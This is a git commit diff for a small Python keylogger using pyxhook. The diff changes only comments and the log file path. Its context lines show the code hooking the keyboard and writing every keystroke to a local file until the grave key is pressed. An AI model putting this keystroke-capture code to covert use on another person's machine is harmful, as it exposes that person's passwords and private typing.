bea72a7459608921a5a469af80a6d5a0b8daf678
hiamandeep <amandeep1024@gmail.com>
2015-10-28 19:08:24 +0530

    Update keylogger.py

--- keylogger.py
+++ keylogger.py
@@ -8,12 +8,12 @@ All keystrokes are recorded in a log file.
 
 The program terminates when grave key(`) is pressed
 
-grave key is found below esc key
+grave key is found below Esc key
 """
 
 import pyxhook
 #change this to your log file's path
-log_file='/home/aman/xxx/file.log'
+log_file='~/Desktop/file.log'
 
 #this function is called everytime a key is pressed.
 def OnKeyPress(event):
@@ -24,10 +24,11 @@ def OnKeyPress(event):
   if event.Ascii==96: #96 is the ascii value of the grave key (`)
     fob.close()
     new_hook.cancel()
-#create a new hook manager instance
+#instantiate HookManager class
 new_hook=pyxhook.HookManager()
-#set KeyDown variable to function to execute when a key is pressed
+#listen to all keystrokes
 new_hook.KeyDown=OnKeyPress
+#hook the keyboard
 new_hook.HookKeyboard()
-#start the recording keys
+#start the session
 new_hook.start()
